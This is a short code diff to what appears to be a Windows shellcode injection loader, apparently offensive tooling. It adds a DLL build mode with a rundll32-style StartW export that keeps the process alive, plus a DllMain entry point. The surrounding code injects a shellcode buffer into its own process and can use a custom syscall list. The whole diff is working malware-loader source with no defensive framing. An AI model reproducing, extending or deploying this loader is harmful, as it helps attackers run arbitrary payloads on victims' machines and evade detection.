@@ -65,7 +65,11 @@ int _main(int argc, char** argv) {
         my_init_syscalls_list();
     #endif
     HANDLE hThread = (HANDLE)-1;
-    NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
+    #ifdef SHAREDOBJECT
+        NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
+    #else
+        NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
+    #endif
     if (NT_FAIL(status) || hThread == (HANDLE)-1) {
         #ifdef _DEBUG_
             printf("inject_shellcode_self: ERROR 0x%x", status);
@@ -80,6 +84,13 @@ int _main(int argc, char** argv) {
 }
 
 #ifdef SHAREDOBJECT
+extern "C"
+__declspec(dllexport)
+void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
+    while (TRUE)
+        Sleep(60000);
+}
+
 __declspec(dllexport)
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
 	switch (dwReason) {
